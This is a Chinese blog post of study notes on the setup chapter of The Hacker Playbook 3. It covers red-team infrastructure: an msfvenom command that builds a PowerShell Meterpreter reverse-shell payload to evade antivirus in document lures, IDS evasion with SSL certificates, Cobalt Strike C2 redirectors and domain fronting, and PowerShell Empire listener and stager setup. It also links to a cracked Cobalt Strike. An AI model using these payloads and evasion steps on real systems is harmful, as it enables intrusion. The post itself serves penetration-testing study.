<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">



<title>THE HACKER PLAYBOOK 3 -- 笔记 -- 安装 | langke Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    



    
    
        
    


</head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">langke&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>

        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">langke&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div id="post-toc" class="post-toc">
            <span class="post-toc-title">catalogue</span>
            <div class="post-toc-content">
                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#第一章-赛前准备-–-安装"><span class="toc-text">第一章 赛前准备 – 安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#前置"><span class="toc-text">前置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#设定你的行动"><span class="toc-text">设定你的行动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#设置你的外部服务器"><span class="toc-text">设置你的外部服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#红队的核心工具"><span class="toc-text">红队的核心工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit-框架"><span class="toc-text">Metasploit 框架</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#混淆-Meterpreter-的-Payload"><span class="toc-text">混淆 Meterpreter 的 Payload</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cobalt-Strike"><span class="toc-text">Cobalt Strike</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Cobalt-Strike基础设施"><span class="toc-text">Cobalt Strike基础设施</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cobalt-Strike的Aggressor脚本"><span class="toc-text">Cobalt Strike的Aggressor脚本</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PowerShell-Empire"><span class="toc-text">PowerShell Empire</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dnscat2"><span class="toc-text">dnscat2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol></li></ol>
            </div>
        </div>
    
    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">THE HACKER PLAYBOOK 3 -- 笔记 -- 安装</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">langke</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">March 28, 2019&nbsp;&nbsp;10:05:11</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <section class="post-content">
            <h1 id="第一章-赛前准备-–-安装"><a href="#第一章-赛前准备-–-安装" class="headerlink" title="第一章 赛前准备 – 安装"></a>第一章 赛前准备 – 安装</h1><h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><p><strong>名词解释：</strong></p>
<ul>
<li>检测时效（TTD）：这是从入侵事件的初始发生到安全分析人员检测并开始处理入侵事件之间的时间。</li>
<li>缓解时效（TTM）：当进行防火墙阻止入侵，DNS污染，或者网络隔绝这些操作的时候，会记录这个时间。</li>
</ul>
<a id="more"></a>
<p><strong>作者希望读者把注意力集中于：</strong></p>
<ul>
<li>应用程序的安全漏洞而不是信息技术的漏洞</li>
<li>模拟真实世界的入侵事件</li>
<li>为红队持续的发展做出极大努力</li>
<li>挑战所有的安全系统…提供真实的数据来证明安全漏洞</li>
</ul>
<p><strong><a href="https://attack.mitre.org/matrices/enterprise/windows/" target="_blank" rel="noopener">APT攻击的 ATT&amp;CK 矩阵</a></strong></p>
<h3 id="设定你的行动"><a href="#设定你的行动" class="headerlink" title="设定你的行动"></a>设定你的行动</h3><p>在红队活动中，我们从几个目标开始。包括但不限于：</p>
<ul>
<li>最终的目标是什么？只是APT检测吗？是要在服务器上获取标志吗？是从数据库中获取数据吗？或者只是为了得到检测时效指标？</li>
<li>是否有我们想要复制的公共活动？</li>
<li>你会用什么技巧？如MITRE ATT&amp;CK矩阵，在每个类别中确切的技术是什么？<ul>
<li><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/windows-index.md" target="_blank" rel="noopener">金丝雀研究小组提供了每一种技术的详细信息。</a></li>
</ul>
</li>
<li>客户希望你使用什么工具？是一些诸如Metasploit、Cobalt Strike、DNS Cat这样的商业攻击工具软件？还是自制的定制化工具？</li>
</ul>
<p>被抓住也是评估的一部分。。。<br>有一些入侵中作者会被抓4到5次，所以心态要放正。</p>
<h3 id="设置你的外部服务器"><a href="#设置你的外部服务器" class="headerlink" title="设置你的外部服务器"></a>设置你的外部服务器</h3><p>购买一个合适的VPS。<br>搭建服务器的一个快速方法是集成TrustedSec公司的渗透测试框架（PTF）.<br><a href="https://github.com/trustedsec/ptf" target="_blank" rel="noopener">PTF框架</a>是一些脚本的集合可以为你做大量的艰苦工作并为其他所有内容创建一个框架。</p>
<ul>
<li>sudo su -</li>
<li>apt-get update</li>
<li>apt-get install python</li>
<li>git clone <a href="https://github.com/trustedsec/ptf" target="_blank" rel="noopener">https://github.com/trustedsec/ptf</a> /opt/ptf</li>
<li>cd /opt/pth &amp;&amp; ./ptf</li>
<li>use modules/exploitation/install_update_all</li>
<li>use modules/intelligence-gathering/install_update_all</li>
<li>use modules/post-exploitation/install_update_all</li>
<li>use modules/powershell/install_update_all</li>
<li>use modules/vulnerability-analysis/install_update_all</li>
<li>cd /pentest</li>
</ul>
<h3 id="红队的核心工具"><a href="#红队的核心工具" class="headerlink" title="红队的核心工具"></a>红队的核心工具</h3><h4 id="Metasploit-框架"><a href="#Metasploit-框架" class="headerlink" title="Metasploit 框架"></a>Metasploit 框架</h4><p>这个社区驱动的框架，似乎每天更新，拥有所有最新的公开漏洞的利用、后渗透利用模块、辅助模块等等。</p>
<h5 id="混淆-Meterpreter-的-Payload"><a href="#混淆-Meterpreter-的-Payload" class="headerlink" title="混淆 Meterpreter 的 Payload"></a>混淆 Meterpreter 的 Payload</h5><p>社工时，可能会使用Word或Excel文档作为我们的payload的载体。<br>但是，包含Meterpreter的payload的二进制文件或让目标机器从web下载的操作，会被杀毒软件拦截。<br>所以，我们可以使用PowerShell绕过<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_http -f psh -o meterpreter-64.ps1 LHOST=127.0.0.1 LPORT 555</span><br></pre></td></tr></table></figure></p>
<p>对比：<br><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/msfvenom_x64_exe.png" alt><br><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/msfvenom_x64_ps1.png" alt></p>
<p><a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode" target="_blank" rel="noopener">此外，使用受信任的机构签发的SSL/TLS证书可以帮助我们绕过某些网络中的IDS(入侵检测系统)</a></p>
<p><strong><a href="https://0x09al.github.io/waf/bypass/ssl/2018/07/02/web-application-firewall-bypass.html" target="_blank" rel="noopener">利用SSL/TLS证书绕过IDS原理</a></strong><br><strong>SSL/TLS证书：</strong></p>
<p>SSL 是指安全套接字层，可确保在用户和站点之间，或两个系统之间传输的数据无法被读取。它使用加密算法打乱传输中的数据，防止数据通过连接传输时被黑客读取。这里所说的数据是指任何敏感或个人信息，例如信用卡号和其他财务信息、个人姓名和住址等。</p>
<p>TLS（传输层安全）是更为安全的升级版 SSL。由于 SSL 这一术语更为常用，因此我们仍然将我们的安全证书称作 SSL。有 ECC、RSA 或 DSA 等加密方式。</p>
<p><strong>证书生成：</strong><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \</span><br><span class="line">    -subj <span class="string">"/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com"</span> \</span><br><span class="line">    -keyout www.example.com.key \</span><br><span class="line">    -out www.example.com.crt &amp;&amp; \</span><br><span class="line">cat www.example.com.key  www.example.com.crt &gt; www.example.com.pem &amp;&amp; \</span><br><span class="line">rm -f www.example.com.key  www.example.com.crt</span><br><span class="line"><span class="string">""</span><span class="string">" </span></span><br><span class="line"><span class="string">命令解析</span></span><br><span class="line"><span class="string">req： PKCS＃10证书请求和证书生成实用程序</span></span><br><span class="line"><span class="string">-new: 新的请求</span></span><br><span class="line"><span class="string">-newkey rsa:4096： 生成一个4096长度的RSA私钥文件，用于签发</span></span><br><span class="line"><span class="string">-days：证书的有效时间</span></span><br><span class="line"><span class="string">-nodes：如果该选项被指定，如果私钥文件已经被创建则不用加密。</span></span><br><span class="line"><span class="string">-x509：输出一个x509格式的证书</span></span><br><span class="line"><span class="string">-subj：用于指定生成的证书请求的用户信息，或者处理证书请求时用指定参数替换。</span></span><br><span class="line"><span class="string">-keyout：处理结束后输出的KEY文件</span></span><br><span class="line"><span class="string">-out：处理结束后输出的证书文件</span></span><br></pre></td></tr></table></figure></p>
<h4 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h4><p>主要用在后期持久渗透、横向移动、流量隐藏、数据窃取。<br>此工具没有直接的漏洞利用，也没有通过最新的0-Day漏洞来破坏系统。<br><a href="https://www.cnblogs.com/ssooking/p/9825917.html" target="_blank" rel="noopener">破解版地址 ===&gt; 持续更新</a></p>
<h5 id="Cobalt-Strike基础设施"><a href="#Cobalt-Strike基础设施" class="headerlink" title="Cobalt Strike基础设施"></a>Cobalt Strike基础设施</h5><p>在基础设施方面，我们希望设置这样一个可重用且高度灵活的环境。<br>Cobalt Strike支持重定向，当你的Cobalt Strike使用的C2域名被销毁了，你不需要创建并启用一个新的环境，只需要替换一个新的C2域名。<br>使用socat配置这些重定向器的信息：</p>
<p><a href="https://blog.cobaltstrike.com/2014/01/14/cloud-based-redirectors-for-distributed-hacking/" target="_blank" rel="noopener">Beacon调用重定向器</a></p>
<p><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/CS_C2重定向.png" alt="利用C2"></p>
<p><a href="https://bluescreenofjeff.com/2018-04-12-https-payload-and-c2-redirectors/" target="_blank" rel="noopener">利用iptables防火墙、https服务重定向</a></p>
<p><a href="http://man.linuxde.net/iptables" target="_blank" rel="noopener">iptables命令_Linux</a></p>
<p><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/CS_重定向_ssl.png" alt="重定向-ssl"></p>
<p><a href="https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/" target="_blank" rel="noopener">高信誉域名重定向器和域前端</a></p>
<p><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/CS_重定向_高信誉域名.png" alt></p>
<p>回答一个我一直在思索的问题：“好好的连接不行吗？为什么要重定向？”<br>答：“如果我们让所有的主机都与一个或两个C2服务器通信，很容易被蓝队一网打尽，整个基础设施被连根拔除。”</p>
<h5 id="Cobalt-Strike的Aggressor脚本"><a href="#Cobalt-Strike的Aggressor脚本" class="headerlink" title="Cobalt Strike的Aggressor脚本"></a>Cobalt Strike的Aggressor脚本</h5><p>Aggressor 脚本是一种面向红队操作和对手模拟的脚本语言，其灵感来源于可脚本化的 IRC 客户端和机器人。</p>
<p>开发目的：</p>
<ul>
<li>你可以创建长时间运行的机器人来模拟虚拟红队成员，并与你并肩进行黑客攻击</li>
<li>你还可以根据你的需要使用它来扩展和修改Cobalt Strike客户端的功能<a href="https://www.cobaltstrike.com/aggressor-script/index.html" target="_blank" rel="noopener">官方介绍</a></li>
</ul>
<p>例子：HarleyQu1nn 将不同的 Aggressor 脚本放在一个项目中提供给你用于后续漏洞利用： <a href="http://bit.ly/2qxIwPE" target="_blank" rel="noopener">http://bit.ly/2qxIwPE</a></p>
<h4 id="PowerShell-Empire"><a href="#PowerShell-Empire" class="headerlink" title="PowerShell Empire"></a>PowerShell Empire</h4><p>官网介绍：Empire是一个纯粹的PowerShell后期开发代理，基于密码安全通信和灵活的架构。Empire实现了运行PowerShell代理的能力，无需PowerShell.exe，可快速部署的后期开发模块，从关键记录器到Mimikatz，以及适应性通信以逃避网络检测，所有这些都包含在以可用性为中心的框架中。<br>官网地址：<a href="https://www.powershellempire.com" target="_blank" rel="noopener">https://www.powershellempire.com</a></p>
<ul>
<li><p><strong>安装</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/EmpireProject/Empire.git</span><br><span class="line">tar \-zxvf ···</span><br><span class="line"><span class="built_in">cd</span> ···</span><br><span class="line">sudo ./setup/install.sh <span class="comment"># 安装程序，会自动安装依赖库</span></span><br><span class="line">./setup/cert.sh         <span class="comment"># 安装证书</span></span><br><span class="line">./empire                <span class="comment"># 运行</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>创建一个监听器</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">listeners</span><br><span class="line">uselistener            <span class="comment"># 按两次 tab 键来查阅所有类型的监听器</span></span><br><span class="line">uselistener http       <span class="comment"># 选择http类型</span></span><br><span class="line">info                   <span class="comment"># 查看监听器的全部配置信息</span></span><br><span class="line"><span class="built_in">set</span> [参数名] [参数值]   <span class="comment"># 设置参数</span></span><br><span class="line">execute                <span class="comment"># 开启监听</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>配置Payload</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usestager [按两次tab键] <span class="comment"># 查看选择类型</span></span><br><span class="line">info                   <span class="comment"># 查看所有设置</span></span><br><span class="line"><span class="built_in">set</span> [参数名] [参数值]   <span class="comment"># 设置参数</span></span><br><span class="line">generate               <span class="comment"># 创建</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>其实套路跟msf一样。</p>
<h4 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h4><p>此工具旨在通过DNS协议创建加密的命令和控制（C&amp;C）通信，这是几乎每个网络的有效隧道。<br>由客户端和服务端两部分组成。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>文中的超链接都是原文地址。不一一列出。</p>

        </section>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>langke</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://yoursite.com/2019/03/28/THE-HACKER-PLAYBOOK-3-笔记-安装/">http://yoursite.com/2019/03/28/THE-HACKER-PLAYBOOK-3-笔记-安装/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="https://langkexiansheng">Langke</a></span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/THE-HACKER-PLAYBOOK-3/"># THE-HACKER-PLAYBOOK-3</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2019/04/01/THE-HACKER-PLAYBOOK-3-笔记-红队侦察/">THE-HACKER-PLAYBOOK-3-笔记-红队侦查</a>
            
            
            <a class="next" rel="next" href="/2019/03/26/黑客秘笈-笔记-前置/">黑客秘笈-笔记-前置</a>
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© langke | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>
</html>
